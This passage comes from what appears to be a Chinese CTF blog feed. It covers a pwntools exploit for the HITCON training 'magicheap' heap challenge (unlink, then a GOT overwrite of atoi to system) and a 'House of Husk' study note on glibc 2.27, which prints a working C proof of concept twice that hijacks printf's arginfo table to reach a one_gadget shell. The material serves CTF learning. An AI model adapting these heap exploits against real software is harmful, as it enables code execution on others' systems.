title="思路二"></a>思路二</h2><p>构造unlink漏洞，修改chunk位置到结构体指针位置，从而控制指针。又因为RELRO 部分开启，所以我们可以劫持GOT表。所以根本没有用上程序的部分功能。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = "debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#context.terminal = ['tmux','split','-h']</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./magicheap"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./magicheap"</span><span class="token punctuation">)</span>hack_addr <span class="token operator">=</span> <span class="token number">0x400c23</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020c0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"heap:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>hack_addr <span class="token operator">=</span> <span class="token number">0x6020e8</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"ffff"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"cccc"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>hack_addr<span class="token number">-0x18</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>hack_addr<span class="token number">-0x10</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token number">0x10</span><span class="token operator">*</span><span class="token string">"a"</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> hitcon training系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House of husk学习记录</title>
      <link href="/2020/10/19/house-of-husk-xue-xi-ji-lu/"/>
      <url>/2020/10/19/house-of-husk-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h1><p>这种攻击方式主要是利用了printf的一个调用链，应用场景是只能分配较大chunk时(超过fastbin)，存在或可以构造出UAF漏洞。类似于之前改global_max_fast后覆盖到top chunk的那种情况，只是后续利用不一样了。</p><p>从源码角度简单分析攻击背后的原理。在使用printf类格式化字符串函数进行输出的时候，该类函数会根据我们格式化字符串的种类不同而采取不同的输出格式进行输出，在glibc中有这样一个函数<br><strong><strong>register_printf_function，为格式化字符为spec的格式化输出注册函数，这个函数是</strong>register_printf_specifier函数的封装。</strong></p><p>进<strong>register_printf_specifier函数，如果格式化符超过0xff或小于0，即不在ascii码则返回-1，如果</strong>printf_arginfo_table为空就通过calloc分配堆内存存放<strong>printf_arginfo_table以及</strong>printf_function_table。两个表空间都为0x100，可以为0-0xff的每个字符注册一个函数指针，第一个表后面紧接着第二个表。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/0.png"></div><p>__printf_function_table[spec]索引处的类型为printf_function的函数指针是我们为chr(spec)这个格式化字符注册的输出函数的函数指针，这个函数在printf-&gt;vfprintf-&gt;printf_positional中被调用。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token function">printf_function</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>__stream<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">struct</span> printf_info <span class="token operator">*</span>__info<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token operator">*</span>__args<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/1.png"></div><p><strong>printf_arginfo_tablespec索引处的类型为printf_arginfo_size_function的函数指针是我们为chr(spec)这个格式化字符注册的输出函数的另一个函数指针，这个函数在printf-&gt;vfprintf-&gt;printf_positional-&gt;</strong>parse_one_specmb中被调用。可以看到其返回值为格式化字符消耗的参数个数，猜测其功能是根据格式化字符做解析。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token function">printf_arginfo_size_function</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> printf_info <span class="token operator">*</span>__info<span class="token punctuation">,</span>size_t __n<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>__argtypes<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>__size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/2.png"></div>```cstruct printf_spec{/* Information parsed from the format spec. */struct printf_info info;/* Pointers into the format string for the end of this formatspec and the next (or to the end of the string if no more). */const UCHAR_T *end_of_fmt, *next_fmt;/* Position of arguments for precision and width, or -1 if `info' hasthe constant value. */int prec_arg, width_arg;int data_arg; /* Position of data argument. */int data_arg_type; /* Type of first argument. *//* Number of arguments consumed by this format specifier. */size_t ndata_args;/* Size of the parameter for PA_USER type. */int size;};```<p>此外，<strong>在vfprintf函数中如果检测到我们注册的table不为空，则对于格式化字符不走默认的输出函数而是调用printf_positional函数，进而可以调用到表中的函数指针</strong>。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/3.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/4.png"></div><h1 id="0x01-POC分析"><a href="#0x01-POC分析" class="headerlink" title="0x01 POC分析"></a>0x01 POC分析</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*** This is a Proof-of-Concept for House of Husk* This PoC is supposed to be run with libc-2.27.*/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><span class="token macro property">#<span class="token directive keyword">define</span> MAIN_ARENA 0x3ebc40</span><span class="token macro property">#<span class="token directive keyword">define</span> MAIN_ARENA_DELTA 0x60</span><span class="token macro property">#<span class="token directive keyword">define</span> GLOBAL_MAX_FAST 0x3ed940</span><span class="token macro property">#<span class="token directive keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><span class="token macro property">#<span class="token directive keyword">define</span> PRINTF_ARGINFO 0x3ec870</span><span class="token macro property">#<span class="token directive keyword">define</span> ONE_GADGET 0x10a38c</span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> libc_base<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// make printf quiet</span><span class="token comment" spellcheck="true">/* leak libc */</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* UAF chunk */</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">offset2size</span><span class="token punctuation">(</span>PRINTF_FUNCTABLE <span class="token operator">-</span> MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">offset2size</span><span class="token punctuation">(</span>PRINTF_ARGINFO <span class="token operator">-</span> MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* avoid consolidation */</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>libc_base <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> MAIN_ARENA <span class="token operator">-</span> MAIN_ARENA_DELTA<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"libc @ 0x%lxn"</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* prepare fake printf arginfo table */</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'X'</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> libc_base <span class="token operator">+</span> ONE_GADGET<span class="token punctuation">;</span><span class="token operator">/</span><span class="token comment" spellcheck="true">/*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;//now __printf_arginfo_table['X'] = one_gadget;/* unsorted bin attack */</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> libc_base <span class="token operator">+</span> GLOBAL_MAX_FAST <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* overwrite global_max_fast */</span><span class="token comment" spellcheck="true">/* overwrite __printf_arginfo_table and __printf_function_table */</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// __printf_function_table => a heap_addr which is not NULL</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//__printf_arginfo_table => one_gadget</span><span class="token comment" spellcheck="true">/* ignite! */</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%X"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行环境为ubuntu 18.04/glibc 2.27，编译命令为gcc ./poc.c -g -fPIE -no-pie -o poc(关闭pie方便调试)。</p><p>代码模拟了UAF漏洞，先分配一个超过fastbin的块，释放之后会进入unsorted bin。<strong>预先分配两个chunk，第一个用来伪造<strong>printf_function_table，第二个用来伪造</strong>printf_arginfo_table。将__printf_arginfo_table[‘X’]处的函数指针改为one_gadget。</strong></p><p>使用unsorted bin attack改写global_max_fast为main_arena+88从而使得释放的所有块都按fastbin处理(都是超过large bin大小的堆块不会进tcache)。<br>在这里有一个很重要的知识就是fastbin的堆块地址会存放在main_arena中，从main_arena+8开始存放fastbin[0x20]的头指针，一直往后推，由于平时的fastbin默认阈值为0x80，所以在glibc-2.23的环境下最多存放到main_arena+0x48，现在我们将阈值改为0x7f*** 导致几乎所有sz的chunk都被当做fastbin，其地址会从main_arena+8开始，根据sz不同往libc覆写堆地址。如此一来，只要我们计算好<strong>printf_arginfo_table和main_arena的地址偏移，进而得到合适的sz，就可以在之后释放这个伪造table的chunk时覆写</strong>printf_arginfo_table为heap_addr。</p><p>总结一下，<strong>先UAF改global_max_fast为main_arena+88，之后释放合适sz的块到fastbin，从而覆写__printf_arginfo_table表为heap地址，heap[‘X’]被覆写为了one_gadget，在调用这个函数指针时即可get shell。</strong></p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*** This is a Proof-of-Concept for House of Husk* This PoC is supposed to be run with libc-2.27.*/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><span class="token macro property">#<span class="token directive keyword">define</span> MAIN_ARENA 0x3ebc40</span><span class="token macro property">#<span class="token directive keyword">define</span> MAIN_ARENA_DELTA 0x60</span><span class="token macro property">#<span class="token directive keyword">define</span> GLOBAL_MAX_FAST 0x3ed940</span><span class="token macro property">#<span class="token directive keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><span class="token macro property">#<span class="token directive keyword">define</span> PRINTF_ARGINFO 0x3ec870</span><span class="token macro property">#<span class="token directive keyword">define</span> ONE_GADGET 0x10a38c</span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> libc_base<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// make printf quiet</span><span class="token comment" spellcheck="true">/* leak libc */</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* UAF chunk */</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">offset2size</span><span class="token punctuation">(</span>PRINTF_FUNCTABLE <span class="token operator">-</span> MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">offset2size</span><span class="token punctuation">(</span>PRINTF_ARGINFO <span class="token operator">-</span> MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* avoid consolidation */</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>libc_base <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> MAIN_ARENA <span class="token operator">-</span> MAIN_ARENA_DELTA<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"libc @ 0x%lxn"</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* prepare fake printf arginfo table */</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'X'</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> libc_base <span class="token operator">+</span> ONE_GADGET<span class="token punctuation">;</span><span class="token operator">/</span><span class="token comment" spellcheck="true">/*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;//now __printf_arginfo_table['X'] = one_gadget;/* unsorted bin attack */</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> libc_base <span class="token operator">+</span> GLOBAL_MAX_FAST <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* overwrite global_max_fast */</span><span class="token comment" spellcheck="true">/* overwrite __printf_arginfo_table and __printf_function_table */</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// __printf_function_table => a heap_addr which is not NULL</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//__printf_arginfo_table => one_gadget</span><span class="token comment" spellcheck="true">/* ignite! */</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%X"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-调试POC"><a href="#0x02-调试POC" class="headerlink" title="0x02 调试POC"></a>0x02 调试POC</h1><p>vfprintf函数中如果检测到我们注册的table不为空，则对于格式化字符不走默认的输出函数而是调用printf_positional函数，进而可以调用到表中的函数指针。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/5.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/6.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/7.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/8.png"></div><p>在进行格式化字符串处理的中遇到X就会调用我们设置好的函数。即getshell。</p><h1 id="0x03-流程及用法简单总结"><a href="#0x03-流程及用法简单总结" class="headerlink" title="0x03 流程及用法简单总结"></a>0x03 流程及用法简单总结</h1><p>也就是说执行printf的时候检查<strong>printf_function_table，如果不为空则调用printf_positional函数，进而调用到</strong>printf_arginfo_table表中的函数指针</p><p>一般先改掉global_max_fast后来覆盖两个表</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/9.png"></div>也就是想办法覆盖掉这两个table位置，同时将__printf_arginfo_table['X']处的函数指针改为one_gadget。（X的ascii码值是88）<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/19/house-of-husk-xue-xi-ji-lu/10.png"></div><p>如果是%u，那么就调用__printf_arginfo_table[‘u’]的函数指针</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 补充知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> house of husk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 SCTF部分pwn题复盘</title>
      <link href="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/"/>
      <url>/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/</url>
      
